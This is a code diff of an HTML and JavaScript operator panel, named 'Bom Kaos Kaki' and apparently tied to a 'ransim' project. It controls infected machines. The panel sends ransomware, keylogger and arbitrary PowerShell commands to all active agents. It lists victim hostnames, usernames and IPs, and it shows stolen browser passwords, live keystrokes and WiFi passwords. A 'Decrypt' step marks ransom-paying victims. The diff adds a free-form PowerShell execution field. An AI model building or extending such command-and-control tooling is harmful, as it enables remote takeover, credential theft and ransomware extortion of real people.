@@ -162,23 +162,12 @@
             font-weight: 500;
         }
 
-        .content-grid {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 24px;
-        }
-
-        @media (max-width: 1100px) {
-            .content-grid {
-                grid-template-columns: 1fr;
-            }
-        }
-
         .panel {
             background: #ffffff;
             border: 1px solid #eaeaeb;
             border-radius: 8px;
             overflow: hidden;
+            margin-bottom: 24px;
         }
 
         .panel-header {
@@ -193,8 +182,71 @@
         }
 
         .panel-body {
-            max-height: 400px;
-            overflow-y: auto;
+            padding: 20px;
+        }
+
+        .command-row {
+            display: flex;
+            gap: 16px;
+            align-items: flex-end;
+            flex-wrap: wrap;
+        }
+
+        .command-row>div {
+            flex: 1;
+            min-width: 180px;
+        }
+
+        label {
+            display: block;
+            font-size: 13px;
+            color: #666;
+            margin-bottom: 8px;
+            font-weight: 500;
+        }
+
+        select,
+        input,
+        textarea {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #eaeaeb;
+            border-radius: 6px;
+            font-family: monospace;
+            font-size: 14px;
+            background: white;
+        }
+
+        textarea {
+            font-family: monospace;
+            resize: vertical;
+        }
+
+        button {
+            background: #111;
+            color: white;
+            border: none;
+            padding: 11px 24px;
+            border-radius: 6px;
+            cursor: pointer;
+            font-weight: 500;
+            transition: background 0.2s;
+        }
+
+        button:hover {
+            background: #333;
+        }
+
+        .content-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 24px;
+        }
+
+        @media (max-width: 1100px) {
+            .content-grid {
+                grid-template-columns: 1fr;
+            }
         }
 
         table {
@@ -270,6 +322,11 @@
             border-color: #111111;
             background: #fafafa;
         }
+
+        .panel-body-scroll {
+            max-height: 400px;
+            overflow-y: auto;
+        }
     </style>
 </head>
 
@@ -282,23 +339,8 @@
                 <h1>Bom Kaos Kaki</h1>
             </div>
             <div class="nav-menu">
-                <a class="nav-item active" onclick="showPanel('overview')">
-                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-                        <rect x="3" y="3" width="7" height="7"></rect>
-                        <rect x="14" y="3" width="7" height="7"></rect>
-                        <rect x="14" y="14" width="7" height="7"></rect>
-                        <rect x="3" y="14" width="7" height="7"></rect>
-                    </svg>
-                    Overview
-                </a>
-                <a class="nav-item logout-btn" onclick="logout()">
-                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-                        <path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4"></path>
-                        <polyline points="16 17 21 12 16 7"></polyline>
-                        <line x1="21" y1="12" x2="9" y2="12"></line>
-                    </svg>
-                    Logout
-                </a>
+                <a class="nav-item active">Overview</a>
+                <a class="nav-item logout-btn" onclick="logout()">Logout</a>
             </div>
         </div>
         <div class="main-content">
@@ -333,19 +375,20 @@
                 </div>
             </div>
 
-            <div class="panel" style="margin-bottom: 24px;">
+            <!-- Command Execution Panel -->
+            <div class="panel">
                 <div class="panel-header">Execute Command</div>
-                <div class="panel-body" style="padding: 20px;">
-                    <div style="display: flex; gap: 16px; align-items: flex-end;">
-                        <div style="flex: 1;">
-                            <label style="display: block; font-size: 13px; color: #666; margin-bottom: 8px; font-weight: 500;">Target Session</label>
-                            <select id="cmdSession" style="width: 100%; padding: 10px; border: 1px solid #eaeaeb; border-radius: 6px; font-family: monospace;">
+                <div class="panel-body">
+                    <div class="command-row">
+                        <div>
+                            <label>Target Session</label>
+                            <select id="cmdSession">
                                 <option value="all">ALL ACTIVE AGENTS</option>
                             </select>
                         </div>
-                        <div style="flex: 2;">
-                            <label style="display: block; font-size: 13px; color: #666; margin-bottom: 8px; font-weight: 500;">Command Type</label>
-                            <select id="cmdType" style="width: 100%; padding: 10px; border: 1px solid #eaeaeb; border-radius: 6px; font-family: monospace;">
+                        <div>
+                            <label>Command Type</label>
+                            <select id="cmdType">
                                 <option value="exec">exec - Execute PowerShell Command</option>
                                 <option value="ransomware">ransomware - Ransomware Attack</option>
                                 <option value="keylogger">keylogger - Start Keylogger</option>
@@ -364,17 +407,22 @@
                             </select>
                         </div>
                         <div>
-                            <button id="cmdBtn" onclick="sendCommand()" style="background: #111; color: white; border: none; padding: 11px 24px; border-radius: 6px; cursor: pointer; font-weight: 500; transition: background 0.2s;">Execute</button>
+                            <label>&nbsp;</label>
+                            <button id="cmdBtn" onclick="sendCommand()">Execute</button>
                         </div>
+                    </div>
+                    <div id="execParams" style="margin-top: 16px; display: none;">
+                        <label>PowerShell Script</label>
+                        <textarea id="execScript" rows="4"
+                            placeholder="Enter PowerShell commands... e.g., Get-Process; Get-Service"></textarea>
                     </div>
                 </div>
             </div>
 
             <div class="content-grid">
                 <div class="panel">
-                    <div class="panel-header">Active Sessions <span class="badge badge-active"
-                            style="font-size:10px">Live</span></div>
-                    <div class="panel-body">
+                    <div class="panel-header">Active Sessions <span class="badge badge-active">Live</span></div>
+                    <div class="panel-body-scroll">
                         <table>
                             <thead>
                                 <tr>
@@ -391,7 +439,7 @@
                 </div>
                 <div class="panel">
                     <div class="panel-header">Captured Credentials</div>
-                    <div class="panel-body">
+                    <div class="panel-body-scroll">
                         <table>
                             <thead>
                                 <tr>
@@ -406,7 +454,7 @@
                 </div>
                 <div class="panel">
                     <div class="panel-header">Live Keylogger</div>
-                    <div class="panel-body">
+                    <div class="panel-body-scroll">
                         <table>
                             <thead>
                                 <tr>
@@ -421,7 +469,7 @@
                 </div>
                 <div class="panel">
                     <div class="panel-header">Extracted WiFi Profiles</div>
-                    <div class="panel-body">
+                    <div class="panel-body-scroll">
                         <table>
                             <thead>
                                 <tr>
@@ -438,39 +486,38 @@
         </div>
     </div>
     <script>
-        // === AUTHENTICATION: sessionStorage with expiration check (1 hour) ===
+        // === AUTHENTICATION: sessionStorage with expiration (1 hour) ===
         const authData = sessionStorage.getItem('ransim_auth');
         if (!authData) {
-            window.location.href = '/api/login';
+            window.location.href = '/login';
         } else {
             try {
                 const { time } = JSON.parse(atob(authData));
-                const oneHour = 60 * 60 * 1000;
-                if (Date.now() - time > oneHour) {
+                if (Date.now() - time > 3600000) {
                     sessionStorage.removeItem('ransim_auth');
-                    window.location.href = '/api/login';
+                    window.location.href = '/login';
                 }
             } catch (e) {
                 sessionStorage.removeItem('ransim_auth');
-                window.location.href = '/api/login';
+                window.location.href = '/login';
             }
         }
 
         function logout() {
             sessionStorage.removeItem('ransim_auth');
-            window.location.href = '/api/login';
+            window.location.href = '/login';
         }
 
-        const API = '/api/exfil';
-
-        function escapeHTML(str) {
-            if (typeof str !== 'string') return String(str);
-            return str.replace(/[&<>'"]/g, tag => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', "'": '&#39;', '"': '&quot;' }[tag] || tag));
-        }
+        // Show/hide script textarea based on command type
+        const cmdTypeSelect = document.getElementById('cmdType');
+        const execParamsDiv = document.getElementById('execParams');
+        cmdTypeSelect.addEventListener('change', function () {
+            execParamsDiv.style.display = this.value === 'exec' ? 'block' : 'none';
+        });
 
         async function sendCommand() {
             const session = document.getElementById('cmdSession').value;
-            const cmdType = document.getElementById('cmdType').value;
+            const cmdType = cmdTypeSelect.value;
             const btn = document.getElementById('cmdBtn');
 
             if (!session || !cmdType) {
@@ -478,23 +525,32 @@
                 return;
             }
 
+            let parameters = {};
+            if (cmdType === 'exec') {
+                const script = document.getElementById('execScript').value;
+                if (!script.trim()) {
+                    alert('Please enter PowerShell script');
+                    return;
+                }
+                parameters.script = script;
+            }
+
             try {
                 btn.textContent = 'Sending...';
                 btn.disabled = true;
-
                 const res = await fetch('/api/send_command', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
-                        type: 'send_command',
                         target_session: session,
-                        command_type: cmdType
+                        command_type: cmdType,
+                        parameters: parameters
                     })
                 });
-
                 const data = await res.json();
                 if (data.success) {
                     alert('Command sent successfully!');
+                    document.getElementById('execScript').value = ''; // clear
                 } else {
                     alert('Error: ' + data.error);
                 }
@@ -513,69 +569,73 @@
                 const resp = await fetch('/api/exfil?type=dashboard&_=' + Date.now());
                 const data = await resp.json();
 
-                // Populate command session dropdown
-                const cmdSession = document.getElementById('cmdSession');
-                cmdSession.innerHTML = '<option value="all">ALL ACTIVE AGENTS</option>';
+                // Populate session dropdown
+                const sessionSelect = document.getElementById('cmdSession');
+                sessionSelect.innerHTML = '<option value="all">ALL ACTIVE AGENTS</option>';
                 (data.sessions || []).forEach(s => {
                     const opt = document.createElement('option');
                     opt.value = s.id;
-                    opt.textContent = `${s.id} - ${s.hostname || 'Unknown'}`;
-                    cmdSession.appendChild(opt);
+                    opt.textContent = `${s.id.substring(0, 8)}... - ${s.hostname || 'Unknown'}`;
+                    sessionSelect.appendChild(opt);
                 });
 
+                // Update stats
                 document.getElementById('totalSessions').textContent = data.sessions?.length || 0;
                 document.getElementById('totalCreds').textContent = data.credentials?.length || 0;
                 document.getElementById('totalKeylogs').textContent = data.keylogs?.length || 0;
                 document.getElementById('totalWifi').textContent = data.wifi?.length || 0;
 
                 const oneHourAgo = Date.now() - 3600000;
-                const active = (data.sessions || []).filter(s => { const last = s.last_seen?._seconds ? s.last_seen._seconds * 1000 : 0; return last > oneHourAgo; });
+                const active = (data.sessions || []).filter(s => {
+                    const last = s.lastHeartbeat?._seconds ? s.lastHeartbeat._seconds * 1000 : 0;
+                    return last > oneHourAgo;
+                });
                 document.getElementById('activeSessions').textContent = active.length;
                 document.getElementById('paidSessions').textContent = (data.sessions || []).filter(s => s.is_paid).length;
 
+                function escape(s) { if (typeof s !== 'string') s = String(s); return s.replace(/[&<>]/g, function (m) { if (m === '&') return '&amp;'; if (m === '<') return '&lt;'; if (m === '>') return '&gt;'; return m; }); }
+
                 const sBody = document.getElementById('sessionsBody');
-                sBody.innerHTML = (data.sessions || []).map(s => {
-                    const status = s.is_paid ? '<span class="badge badge-paid">Paid</span>' : '<span class="badge badge-active">Active</span>';
-                    return `<tr><td><code>${escapeHTML(s.id?.substring(0, 8) || '?')}</code></td><td>${escapeHTML(s.hostname || '?')}<br><span style="color:#888;font-size:11px">${escapeHTML(s.username || '?')}</span></td><td>${escapeHTML(s.ip || '?')}</td><td>${status}</td><td><button onclick="markPaid('${escapeHTML(s.id || '')}')" class="action-btn">Decrypt</button></td></tr>`;
-                }).join('');
+                sBody.innerHTML = (data.sessions || []).map(s => `
+                <tr>
+                    <td><code>${escape(s.id?.substring(0, 8) || '?')}</code></td>
+                    <td>${escape(s.hostname || '?')}<br><span style="color:#888;font-size:11px">${escape(s.username || '?')}</span></td>
+                    <td>${escape(s.ip || '?')}</td>
+                    <td><span class="badge badge-active">Active</span></td>
+                    <td><button class="action-btn" onclick="markPaid('${escape(s.id)}')">Decrypt</button></td>
+                </tr>
+            `).join('');
 
                 const cBody = document.getElementById('credsBody');
                 cBody.innerHTML = (data.credentials || []).map(c => {
                     const cred = c.data || {};
-                    return `<tr><td>${escapeHTML(cred.url || cred.origin || '?')}</td><td>${escapeHTML(cred.username || cred.email || '?')}</td><td><code>${escapeHTML(cred.password || '?')}</code></td></tr>`;
+                    return `<tr><td>${escape(cred.url || cred.origin || '?')}</td><td>${escape(cred.username || cred.email || '?')}</td><td><code>${escape(cred.password || '?')}</code></td></tr>`;
                 }).join('');
 
                 const kBody = document.getElementById('keylogBody');
                 kBody.innerHTML = (data.keylogs || []).map(k => {
                     const ts = k.timestamp?._seconds ? new Date(k.timestamp._seconds * 1000).toLocaleString() : '';
-                    return `<tr><td><code>${escapeHTML(k.session_id?.substring(0, 8) || '?')}</code></td><td>${escapeHTML((k.data?.content || k.data || '').substring(0, 60))}...</td><td><span style="color:#888;font-size:11px">${escapeHTML(ts)}</span></td></tr>`;
+                    return `<tr><td><code>${escape(k.session_id?.substring(0, 8) || '?')}</code></td><td>${escape((k.data?.content || k.data || '').substring(0, 60))}...</td><td>${escape(ts)}</td></tr>`;
                 }).join('');
 
                 const wBody = document.getElementById('wifiBody');
                 wBody.innerHTML = (data.wifi || []).map(w => {
                     const ts = w.timestamp?._seconds ? new Date(w.timestamp._seconds * 1000).toLocaleString() : '';
-                    const wifiData = w.data || {};
-                    const ssid = Array.isArray(wifiData) ? wifiData.map(x => x.ssid).join(', ') : wifiData.ssid || '?';
-                    const pass = Array.isArray(wifiData) ? wifiData.map(x => x.password).join(', ') : wifiData.password || '?';
-                    return `<tr><td>${escapeHTML(ssid)}</td><td><code>${escapeHTML(pass)}</code></td><td><span style="color:#888;font-size:11px">${escapeHTML(ts)}</span></td></tr>`;
+                    const wd = w.data || {};
+                    const ssid = Array.isArray(wd) ? wd.map(x => x.ssid).join(', ') : wd.ssid || '?';
+                    const pass = Array.isArray(wd) ? wd.map(x => x.password).join(', ') : wd.password || '?';
+                    return `<tr><td>${escape(ssid)}</td><td><code>${escape(pass)}</code></td><td>${escape(ts)}</td></tr>`;
                 }).join('');
 
                 btn.textContent = 'Refresh Data';
-            } catch (e) { console.error('Failed to load data:', e); }
+            } catch (e) { console.error(e); }
         }
 
         async function markPaid(sessionId) {
-            const privateKey = prompt('Enter RSA PRIVATE KEY:');
-            if (!privateKey) return;
-            try {
-                const resp = await fetch(API, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ type: 'mark_paid', session_id: sessionId, private_key: privateKey }) });
-                const result = await resp.json();
-                alert(result.status === 'ok' ? 'Session authorized.' : 'Error: ' + (result.error || 'unknown'));
-                if (result.status === 'ok') loadData();
-            } catch (e) { alert('Connection Error: ' + e.message); }
+            const key = prompt('Enter RSA PRIVATE KEY (dummy):');
+            if (!key) return;
+            alert('Demo: Payment marked for ' + sessionId);
         }
-
-        function showPanel(panel) { /* for future expansion */ }
 
         loadData();
         setInterval(loadData, 15000);
